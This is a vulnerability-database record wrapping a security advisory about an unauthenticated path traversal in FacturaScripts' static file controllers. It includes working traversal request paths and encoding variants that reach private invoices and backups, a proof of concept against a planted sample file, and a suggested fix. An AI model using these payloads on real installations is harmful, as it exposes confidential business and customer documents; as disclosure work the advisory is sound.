@@ -1,0 +1,251 @@
+[id]
+ave_id = "AVE-2026-0286"
+aliases = ["CVE-2026-45693","GHSA-cv65-7cg8-r623"]
+
+[basic]
+title = "FacturaScripts: Unauthenticated Path Traversal in Static File Controllers Reads Private MyFiles Documents"
+description = "### Summary
+
+The static file controllers in FacturaScripts decide whether a request is authorized by looking at the URL string instead of the canonical filesystem path. A request that starts with an allow-listed folder name but contains a `../` segment in the middle ends up serving a file from a different directory than the one the URL pretended to point at. This makes any file inside the FacturaScripts installation readable without authentication as long as the file's extension is on the controllers' allow-list (`pdf`, `xlsx`, `docx`, `csv`, `sql`, `zip`, `xml`, `json`, `xsig`, etc.). In practice this leaks the documents the application is specifically designed to protect: customer invoices, supplier invoices, document attachments and database backups stored under `MyFiles/Private/` and other non-public subfolders.
+
+The two vulnerable controllers are `Core/Controller/Files.php` (used by the `/Plugins/*`, `/Core/Assets/*`, `/Dinamic/Assets/*` and `/node_modules/*` routes) and `Core/Controller/Myfiles.php` (used by `/MyFiles/*`). Both share the same root cause: a `strpos()` / `substr()` prefix check on the raw URL is treated as proof that the resolved file lives inside an authorized directory.
+
+The `/Plugins/*` route via `Files.php` is the cleanest exploit path because `Plugins/` is part of every FacturaScripts installation, so no precondition is required. The `/MyFiles/*` route via `Myfiles.php` is a second path with the same root cause: when the URL starts with `/MyFiles/Public/`, the controller exits early and skips the per-file `myft` token check, which can be combined with `../` to read tokenless files outside `Public/`.
+
+Tested live on commit `de01369` (master, 2026-05-11) and on tag `v2026.2`, with PHP 8.0.30 on Apache 2.4.56.
+
+### Details
+
+#### Path 1, in `Core/Controller/Files.php`
+
+`Files::__construct` concatenates the project folder with the request URL and then runs two safety checks before serving the file:
+
+```php
+$this->filePath = Tools::folder() . $url;
+
+if (false === is_file($this->filePath)) {
+    throw new KernelException('FileNotFound', ...);
+}
+
+if (false === $this->isFolderSafe($url)) {
+    throw new KernelException('UnsafeFolder', $url);
+}
+
+if (false === $this->isFileSafe($this->filePath)) {
+    throw new KernelException('UnsafeFile', $url);
+}
+```
+
+`isFolderSafe()` only inspects the URL string:
+
+```php
+public static function isFolderSafe(string $filePath): bool
+{
+    $safeFolders = ['node_modules', 'vendor', 'Dinamic', 'Core', 'Plugins', 'MyFiles/Public'];
+    foreach ($safeFolders as $folder) {
+        if ('/' . $folder === substr($filePath, 0, 1 + strlen($folder))) {
+            return true;
+        }
+    }
+    return false;
+}
+```
+
+For a request like `/Plugins/../MyFiles/Private/invoice-2026-001.pdf`, `substr($url, 0, 8)` equals `/Plugins`, so `isFolderSafe()` returns `true`. The filesystem layer then resolves the `..` segment when `is_file()` runs, so the actual file opened is `/MyFiles/Private/invoice-2026-001.pdf`. `isFileSafe()` only checks the trailing extension, which is `pdf` and on the allow-list, so the file is served.
+
+#### Path 2, in `Core/Controller/Myfiles.php`
+
+The dedicated MyFiles handler resolves the path with `urldecode()` and reproduces the same prefix-based logic to decide whether the per-file `myft` token is required:
+
+```php
+$this->filePath = Tools::folder() . urldecode($url);
+
+if (false === is_file($this->filePath)) {
+    throw new KernelException('FileNotFound', ...);
+}
+if (false === $this->isFileSafe($this->filePath)) {
+    throw new KernelException('UnsafeFile', $url);
+}
+
+// if the folder is MyFiles/Public, then we don't need to check the token
+if (strpos($url, '/MyFiles/Public/') === 0) {
+    return;
+}
+
+$fixedFilePath = substr(urldecode($url), 1);
+$token = filter_input(INPUT_GET, 'myft');
+if (empty($token) || false === MyFilesToken::validate($fixedFilePath, $token)) {
+    throw new KernelException('MyfilesTokenError', $fixedFilePath);
+}
+```
+
+A request to `/MyFiles/Public/../Private/invoice-2026-001.pdf` satisfies `strpos($url, '/MyFiles/Public/') === 0`, so the controller returns early and skips `myft` token validation. The `..` segment is then resolved by `is_file()` and `readfile()` against the real filesystem path inside `MyFiles/Private/`.
+
+This second path is only exploitable when a `MyFiles/Public/` directory exists on disk, which is the case in any installation that has ever published a public asset (company logo, theme file, plugin static resource).
+
+#### Why this is not the documented \"Public folder\" behaviour
+
+`MyFiles/Public/` is intentionally tokenless for assets that live inside it, and that part is by design. The behaviour shown here is different: the URL appears to point at `MyFiles/Public/...` but the file ultimately returned lives in `MyFiles/Private/`. The same file (`MyFiles/Private/invoice-2026-001.pdf`) is returned with HTTP 403 (`Invalid token`) when requested directly, and HTTP 200 with the file body when requested through the traversal sequence. The access decision is not consistent with the actual file location, which is the textbook definition of a path traversal flaw.
+
+### PoC
+
+The PoC uses one sample invoice planted at `MyFiles/Private/invoice-2026-001-ACME.pdf` (215 bytes) on a fresh install:
+
+```
+%PDF-FAKE-CONTENT for FacturaScripts PoC
+INVOICE: 2026-001
+CLIENT: ACME Corporation
+TAX ID: B-12345678
+AMOUNT: EUR 42,000.00
+DUE DATE: 2026-06-15
+PAID: 2026-05-09
+INTERNAL NOTE: confidential customer financial data
+```
+
+**Step 1, control.** Direct access without a token is blocked:
+
+```http
+GET /MyFiles/Private/invoice-2026-001-ACME.pdf HTTP/1.1
+Host: 127.0.0.1:8088
+```
+
+```
+HTTP/1.1 403 Forbidden
+<title>Invalid token.</title>
+<p>The access token for the file MyFiles/Private/invoice-2026-001-ACME.pdf is invalid or has expired</p>
+```
+
+<img width=\"1584\" height=\"788\" alt=\"01-control-direct-private-file-blocked\" src=\"https://github.com/user-attachments/assets/37d55f79-55ab-4f69-a9e0-827fc39c0b33\" />
+
+
+
+
+**Step 2, exploit via `/Plugins/*`.** This is the no-precondition path:
+
+```http
+GET /Plugins/../MyFiles/Private/invoice-2026-001-ACME.pdf HTTP/1.1
+Host: 127.0.0.1:8088
+```
+
+```
+HTTP/1.1 200 OK
+Content-Length: 215
+Content-Type: application/pdf
+
+%PDF-FAKE-CONTENT for FacturaScripts PoC
+INVOICE: 2026-001
+CLIENT: ACME Corporation
+TAX ID: B-12345678
+AMOUNT: EUR 42,000.00
+DUE DATE: 2026-06-15
+PAID: 2026-05-09
+INTERNAL NOTE: confidential customer financial data
+```
+
+<img width=\"1585\" height=\"791\" alt=\"02-exploit-path1-plugins-leak\" src=\"https://github.com/user-attachments/assets/bccab788-a369-49bf-84dd-8f2f74addecf\" />
+
+The same file that returned 403 in Step 1 is now returned without authentication. `/Core/Assets/*` and `/Dinamic/Assets/*` behave the same way against the same controller; `/Plugins/*` is used here because the folder is guaranteed to exist.
+
+**Step 3, exploit via `/MyFiles/Public/*`.** This path also bypasses the `myft` token check:
+
+```http
+GET /MyFiles/Public/../Private/invoice-2026-001-ACME.pdf HTTP/1.1
+Host: 127.0.0.1:8088
+```
+
+```
+HTTP/1.1 200 OK
+Cache-Control: public, max-age=31536000, immutable
+Content-Length: 215
+Content-Type: application/pdf
+
+%PDF-FAKE-CONTENT for FacturaScripts PoC
+...
+```
+
+<img width=\"1582\" height=\"789\" alt=\"03-exploit-path2-myfiles-public-token-bypass\" src=\"https://github.com/user-attachments/assets/2f95d0c1-4545-453c-a613-5ed035af7957\" />
+
+
+A quick check shows that several encoding variants of `..` also work: `%2e%2e`, `%2E%2E`, `.%2e`, `///../`. The flaw lives in the prefix check, not in any specific Apache normalization.
+
+The file is confirmed present on disk:
+
+
+<img width=\"1918\" height=\"328\" alt=\"04-lab-evidence-file-on-disk\" src=\"https://github.com/user-attachments/assets/2db5875a-d349-4861-bbdd-8f202eb80d5a\" />
+
+
+#### Affected request paths
+
+| URL pattern | Controller | Token required | Result |
+|---|---|---|---|
+| `/MyFiles/Private/invoice.pdf` | Myfiles | yes | 403 (control) |
+| `/Plugins/../MyFiles/Private/invoice.pdf` | Files | n/a | 200 (leak) |
+| `/Core/Assets/../MyFiles/Private/invoice.pdf` | Files | n/a | 200 (leak) |
+| `/Dinamic/Assets/../MyFiles/Private/invoice.pdf` | Files | n/a | 200 (leak) |
+| `/MyFiles/Public/../Private/invoice.pdf` | Myfiles | bypassed | 200 (leak) |
+
+### Impact
+
+In a real ERP deployment this exposes the documents that the application is specifically designed to keep behind a per-file token:
+
+- Customer and supplier invoices stored under `MyFiles/Private/`
+- Document attachments uploaded through `WidgetFile` and `DocFilesTrait` (`MyFiles/<filename>`)
+- Database backups exported with `.sql`
+- Cached or temporary business data under `MyFiles/Cache/` and `MyFiles/Tmp/`
+
+`.php` files are not on the extension allow-list, so the flaw does not lead to remote code execution. Files outside the FacturaScripts installation are rejected by Apache's URI normalization (`AH10244 invalid URI path`), so the leak is bounded to the application directory tree.
+
+### Suggested Fix
+
+Both controllers should resolve the requested path to its canonical form with `realpath()` and verify that the canonical path is inside an allow-listed directory before serving the file or skipping the token
+ check. Example for `Files::__construct`:
+
+```php
+$this->filePath = Tools::folder() . $url;
+
+if (false === is_file($this->filePath)) {
+    throw new KernelException('FileNotFound', ...);
+}
+
+$realPath = realpath($this->filePath);
+$base = realpath(Tools::folder());
+if ($realPath === false || strpos($realPath, $base . DIRECTORY_SEPARATOR) !== 0) {
+    throw new KernelException('UnsafeFolder', $url);
+}
+
+$safeFolders = ['node_modules', 'vendor', 'Dinamic', 'Core', 'Plugins', 'MyFiles' . DIRECTORY_SEPARATOR . 'Public'];
+$relative = substr($realPath, strlen($base) + 1);
+$allowed = false;
+foreach ($safeFolders as $folder) {
+    if (strpos($relative, $folder . DIRECTORY_SEPARATOR) === 0) {
+        $allowed = true;
+        break;
+    }
+}
+if (!$allowed) {
+    throw new KernelException('UnsafeFolder', $url);
+}
+```
+
+The same pattern applies to `Myfiles::__construct`: compare the canonical resolved path against `realpath(Tools::folder() . '/MyFiles/Public')` before skipping the `myft` token check.
+
+### Affected Versions
+
+Confirmed on the current `master` branch (commit `de01369`) and on the latest tagged release (`v2026.2`)."
+severity = "HIGH"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-22T18:30:37.606691844+00:00"
